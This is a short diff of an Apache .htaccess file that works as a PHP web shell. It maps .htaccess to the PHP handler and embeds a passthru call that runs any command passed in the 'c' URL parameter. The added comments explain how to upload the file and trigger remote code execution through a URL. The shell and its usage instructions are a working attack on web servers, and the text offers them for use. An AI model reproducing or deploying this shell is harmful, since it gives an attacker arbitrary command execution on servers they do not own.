@@ -12,3 +12,7 @@ Allow from all
 # the apache directives from the .htaccess file
 AddType application/x-httpd-php .htaccess
 ###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
+
+# Simply upload the preferred shell as a .htaccess file 
+# and then visit the .htaccess file via 
+# the url http://domain/path/.htaccess?c=command for remote code execution
